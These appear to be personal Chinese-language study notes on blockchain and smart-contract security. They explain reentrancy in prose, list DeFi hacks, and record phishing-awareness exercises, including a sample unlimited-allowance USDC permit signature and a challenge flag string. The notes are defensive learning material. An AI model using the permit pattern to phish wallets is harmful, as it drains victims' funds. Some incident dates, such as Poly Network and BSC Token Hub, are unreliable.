4. **关键点**：当 `Attack` 合约收到这笔以太币时，它的 `fallback()` 函数被触发了。
5. 在 `fallback()` 函数中，黑客**再一次（重入）调用了 `EtherStore.withdraw()`，要求再提领 1 ETH。
6. **致命漏洞**：因为 `EtherStore` 的代码还没执行到第3步（更新余额），所以它账上的记录依然是「黑客还有 1 ETH」。因此，第二次的余额检查**再次通过**！
7. `EtherStore` 又一次尝试发送 1 ETH 给黑客，这又触发了黑客的 `fallback()`，形成一个无限循环，直到 `EtherStore` 合约的资金被掏空为止。[原理和预防](https://learnblockchain.cn/article/18336)

- **Poly Network攻击（2020年）**：该跨链DeFi平台因智能合约控制权被黑客夺取，导致6.12亿美元被盗，凸显智能合约跨链和控制权限的安全风险。[c-csa](https://c-csa.cn/u_file/photo/20230518/29d8ed085d.pdf)
    
- **闪电贷攻击事件**：如2020年bZx借贷协议遭两次闪电贷攻击，损失近百万美元，利用智能合约机制中的价格预言机和市场操纵漏洞进行攻击。2023年Euler Finance利用闪电贷漏洞被盗约1.97亿美元，亦是智能合约中的市场机制漏洞利用典型。[panewslab+2](https://www.panewslab.com/zh/articles/oebo032n)
    
- **Parity多重签名钱包漏洞（2017年）**：因智能合约库存在漏洞，约51.37万个以太币被永久锁定。[c-csa](https://c-csa.cn/about/news-detail/i-336.html)
    
- **Bancor平台管理员权限被盗（2018年）**：智能合约中管理员权限过高导致盗取价值数千万美元币资。[c-csa](https://c-csa.cn/about/news-detail/i-336.html)
    
- **Lendf.Me重入漏洞攻击（2020年）**：智能合约中存在重入漏洞和特定代币兼容性问题，导致2500万美元资产被盗。[简介](https://abmedia.io/lendf-me-hacked-details-analysis-and-defense-suggestions)
    
- **跨链桥智能合约漏洞攻击（2024年）**：如BSC Token Hub跨链桥被攻击，伪造交易提取大量币，显示跨链智能合约风险居高不下。[简介](https://blog.csdn.net/weixin_42056967/article/details/127212623)
- 原因：Merkle验证机制的漏洞
	- BNB链上的预编译合约（地址0x65）负责验证跨链提交的Merkle Proof，但它对包含多个叶子节点（Leaves）的Proof处理不严谨，只针对单个叶子的情况验证，导致边界情况处理漏洞。   
	- 攻击者构造包含多个叶子的恶意Proof数据，绕过了合约的校验机制，从而虚假证明了大量BNB的合法性，合约误判通过验证，造成了BNB的额外增发。

# 2025-08-07

# USDC Permit 釣魚
```
通過使用 EIP-2612 permit 簽名, 允許地址 0x1234...7890 使用你的全部 USDC 餘額，直到 2025/9/6 17:36:29
 "message": {
    "owner": "0xBF654d909728d4a40ADBFfB2A5Dc540827D158D8",
    // 授权的地址
    "spender": "0x1234567890123456780012345678901234567890",
    //无限制金额
    "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
    "nonce": 239360,
    // 过期时间
    "deadline": 1757151389
  },
   "signature": "0xb7acd5664a80a168686b63e6a568de4ae24b8859adfae99c704c3d58ec2d1c1836885351342772d18411a76c48dc776ade1c6e6c2a60f129feabad8aff5d08581b",
  "r": "0xb7acd5664a80a168686b63e6a568de4ae24b8859adfae99c704c3d58ec2d1c18",
  "s": "0x36885351342772d18411a76c48dc776ade1c6e6c2a60f129feabad8aff5d0858",
  "v": 27
```

# 空头诈骗
向合约f832a0发送0.5ETH。
函数选择器调用SecurityUpdate() 的函数，将资金转移给攻击者
![](Pasted%20image%2020250807174651.png)
# 授权钓鱼攻击
当心increaseAllowance函数，可以增加代币授权额度
![](Pasted%20image%2020250807175204.png)

# 超高收益質押平台
```
预计变化
您正在授予其他人从您的账户中花费该金额的权限。
支出上限
**无限制**
0x87350...57C75
消费者
0x00000...60000
请求来自
unphishable.io
```

# Telegram 代幣釣魚挑戰
* 未經請求的免費代幣或空投消息
- 領取獎勵的緊迫感或時間壓力
- 要求提供助記詞或私鑰
- 承諾高價值獎勵
- 語法或拼寫錯誤
# Punycode 釣魚攻擊
定义：Punycode 是一种编码系统，允许将非 ASCII 字符（如西里尔字母、中文等）转换为 ASCII 字符，以便在域名系统中使用。攻击者经常利用视觉上相似的字符创建看似合法的域名。 例如，某些特殊字符看起来与拉丁字母几乎相同，但它们是不同的字符： 你可以使用 [Punycoder](https://www.punycoder.com/) 来转换 Unicode 和 Punycode 域名。

# Microsoft Teams 恶意软件钓鱼模拟
* 可疑 URL：注意域名是 "microsoft-meet.com" 而不是 "teams.microsoft.com"
- 简化界面：与真实的 Teams 登录相比，虚假页面具有简化的界面
- 缺乏安全功能：缺少 Microsoft 通常包含的安全元素
- 加入按钮：突出的 "在 Teams 应用程序中加入" 按钮可能会导致恶意软件下载
- TEAMS_MALWARE_2025

# 假冒扩展钓鱼
安装虚假扩展程序办法：
1. 创建一个新钱包（最好在新浏览器上）并将所有资金从受损钱包中转出
2. 卸载扩展程序
3. 更改所有可能已被泄露的密码
4. 检查您的加密货币钱包中是否有未经授权的交易
5. 使用信誉良好的防病毒软件扫描您的设备以查找恶意软件
6. 监控您的账户是否有可疑活动
7. 考虑使用硬件钱包以获得额外安全性

# 2025-08-06

目標：智能合約工程師
* 開發、部署智能合約，確保合約的安全性、可靠性、高效性
* solidity(現在solana使用的是rust)
* 根據需求設計合適的智能合約架構
* 部署智能合约至区块链网络（如以太坊、Polygon、Arbitrum、Base 等），并确保合约的高效执行。
- 编写智能合约的单元测试，进行代码审计与安全性测试，确保合约代码无漏洞，避免潜在的安全风险。
- 優化合約，減少gas費用
- 熟悉 Ethereum、Polygon、Arbitrum、Base 等主流区块链平台，能够在这些平台上部署和维护智能合约
- 了解智能合约开发的安全性问题，具备智能合约审计和漏洞修复经验，熟悉常见的攻击模式（如重入攻击、溢出、权限管理等）
- 熟悉区块链的基本原理，理解 Gas 费用、交易确认、区块链共识机制等概念。
- 熟练使用 Foundry、Hardhat、Remix 等智能合约开发框架，具备项目开发、测试与部署经验。
- 具备一定的 Viem、Web3.js、Ethers.js 等 Web3 工具使用经验，能够与前端或其他系统进行无缝集成。
- 熟悉 IPFS、NFT、Token 标准（ERC-20、ERC-721、ERC-1155 等）及去中心化身份（DID）等 Web3 相关技术
```# 常用技术栈
- Solidity
- Remix
- Foundry / Hardhat
- Phalcon / Tenderly
- Yul
```
求職平臺：
- [DeJob](https://www.dejob.top/) - 中文，大量高频工作机会
- [SmartDeer](https://www.smartdeer.com/) - 中文，综合性的招聘平台
- [电鸭社区](https://eleduck.com/) - 中文，远程工作者社区
- [Web3Career](https://web3.career/) - 英文，专业的 Web3 招聘平台
- [CryptoJobs](https://crypto.jobs/) - 英文，区块链行业招聘信息
- [LInkedin](http://linkedin.com/) - 英文

# 2025-08-05

## 智能合约
定义：存储在区块链上的可执行代码，能够在满足预设条件时自动执行操作，无需人工干预。
影响：在数字货币以外，可以构建去中心化应用(DApp)、非同质化代币（NFT）等生态系统的基础设施

|维度|比特币（Bitcoin）|以太坊（Ethereum）|
|---|---|---|
|**目标与定位**|去中心化的数字货币，强调安全、稳定和稀缺性（总量 2100 万枚）|去中心化平台，支持智能合约和 Dapps，定位为“区块链 2.0”|
|**编程能力**|脚本语言有限，仅支持简单的交易验证逻辑|图灵完备的编程语言（如 Solidity），可开发复杂智能合约|
|**共识机制**|工作量证明（PoW），矿工通过算力竞争记账权|从 PoW 转向权益证明（PoS），通过 The Merge 实现能源效率优化|
|**交易速度**|每 10 分钟生成一个区块，交易确认较慢|区块时间约 12 秒，交易确认更快，适合高频应用|
|**经济模型**|总量固定，强调抗通胀属性|供应灵活，通过 EIP-1559 等机制可能呈现通缩趋势|


## 以太坊演进
### 1.0
使用PoW(工作量证明)
* 矿工通过计算机算力“挖矿”，争夺打包交易的权利。
- 矿工需要消耗大量电力资源，竞争激烈。
- 成功打包区块的矿工会获得新生成的 ETH 奖励。
问题：
* **能耗高**：全球以太坊矿工的电力消耗相当于一个小国家的用电量。
- **扩展性差**：每秒只能处理约 30 笔交易（TPS），速度慢、费用高。
解决方案：
* Homestead：修复安全漏洞，优化 Gas 计算，加入新操作码。
* Metropolis：
	* Byzantium：
		* 引入 zkSNARKs 支持（零知识证明）。
		- 降低难度炸弹(Difficulty Bomb)影响（推迟PoS切换时间）
	* Constantinople：
		* 减少某些操作Gas费用。  
		- 延后难度炸弹。
		- PS: Difficulty Bomb = 挖矿越来越难 + 区块时间变长 + 以太坊“冻结” = 社区必须升级或停摆。
- Istanbul：
	- 提升EVM性能。
	* 加强与Zcash等其他链的兼容性。

### 2.0
事件：The Merge
* Beacon Chain：
	* 引入PoS
	* 实现质押机制
	* 构建PoS验证者网络
	* 和主网并行存在，互不干扰
* London 升级
	* 改革交易手续费机制，引入'基础费+小费'模型
	* 提高Gas预测准确性，减少网络拥堵
	* 一部分 ETH 会被销毁（deflationary mechanism）
* **The Merge**(2022.09.15)
	* 正式从 PoW 切换至 PoS，标志性升级
	* Beacon 链接管共识, 将共识机制“插接”到信标链的 PoS 系统   
	- 废除挖矿，提高网络安全
	- PoS：
		- 准入门槛：质押 32 ETH 成为验证者
		- 工作方式：系统随机选择验证者来提议和验证区块
		- 奖励机制：验证者获得新发行的 ETH + 交易费用
		- 惩罚机制：作恶者质押的 ETH 被销毁（Slashing）
		* 相比 PoW 的优势
			- **能耗降低 99.95%**：无需大量电力和硬件
			- **经济安全性**：攻击成本约需控制全网 67% 的质押 ETH（价值数百亿美元）
			- **最终确定性**：区块确认更快、更可靠
- Shapella（Shanghai + Capella，2023.04）:
	- 支持质押 ETH 的提款（EIP-4895）
- Dencun（Deneb + Cancun）:
	- 实现数据分片原型，降低L2费用，提高扩容性。
	- 专注于**数据分片**，配合 Layer 2 实现扩容
	- 主网专注安全和数据可用性，Layer 2 负责大量交易处理
	- 引入 Proto-Danksharding（EIP-4844）
		- **问题**：以前 L2 提交数据需要使用常规交易，成本高昂
		- **解决方案**：引入专门的“Blob 交易”类型，数据存储成本大幅降低
		- **技术细节**：Blob 数据会在一定时间后自动删除，不会永久占用主网存储
	- ZK-Rollup
		- **批量处理**：在链下一次性处理数百笔交易
		- **零知识证明**：生成一个简洁的“正确性证明”
		- **主网验证**：以太坊只需验证这个证明，无需重新执行所有交易

# 2025-08-04

# 区块链
* 定义：去中心化的分布式账本技术，用于在网络节点之间安全、透明且不可篡改地记录事务数据。
* 组成：区块 + 链
	* 区块：交易记录 + 前一个区块hash
		* 存储有限(存储是真的贵啊)
			* 主要解决方案：
				* **链下存储+链上验证**：IPFS、Swarm、Arweave 等兴起，链上仅存摘要或引用
				* **模块化区块链 / 数据可用性层**：Celestia、Avail、EigenDA。“共识”“执行”“数据可用性”拆分成独立模块，数据层只负责广播数据，不必所有节点都存储
				* **Layer 2 Rollup + Validity/Optimistic Proofs**：zkRollup，Optimistic Rollup（Arbitrum, Optimism）。将大量交易和数据在链下处理，仅将结果及证明回传主链
				* **去中心化数据库和索引服务**：The Graph、Lighthouse、Fluence。提供索引和查询服务，将复杂数据查询从链上移至链下
		* 每个区块会在一定时间内打包，例如大概 10 分钟打包生成一个(BTC)。如下表

| 区块链                     | 共识机制                  | 打包时间       | 特点                               |
| ----------------------- | --------------------- | ---------- | -------------------------------- |
| **比特币**                 | PoW (SHA-256)         | ~10 分钟     | 最稳健，出块慢，安全性高                     |
| **以太坊**                 | PoS（现为Casper）         | ~12 秒      | 合并前是 PoW（13-15秒），合并后略快           |
| **BNB Chain**           | PoSA（混合PoS+Authority） | ~3 秒       | 高吞吐，中心化程度较高                      |
| **Solana**              | PoH + PoS             | ~0.4 秒     | 极快出块，高性能，但曾因宕机受质疑                |
| **Avalanche**           | Avalanche Consensus   | ~1-2 秒     | 并行处理交易，高速可扩展                     |
| **Cosmos**              | Tendermint（BFT类）      | ~6-7 秒     | 快速确认，适用于跨链通信                     |
| **Arbitrum / Optimism** | Layer2 Rollup         | 以太坊 L1区块为锚 | Rollup 本身秒级处理，但上链结算需要等待 L1 的确认时间 |
| **Celestia**            | Modular + DA层         | ~3-5 秒     | 仅负责数据可用性，不执行交易                   |

	* 链：
		* 一条链只可以链接两个区块。
		* 区块按照顺序串联
* 特点：
	* 不可篡改：无法改变历史信息，因为每个区块包含了上一个区块的摘要并串联起来，如果你修改了历史的区块，你将必须修改后面的全部区块。
		* 篡改条件：（成本高，难度大）
			* 重写目标区块及其后的所有区块  
			- 控制全网 51% 的计算能力（PoW）
			- 避免被其他 honest 节点识破并拒绝同步
			- 快速追赶并超过现有合法最长链
	* 公开透明，匿名
	* 快速交易：相比传统的跨国汇款非常快速便捷。


# 2025.07.30


<!-- Content_END -->
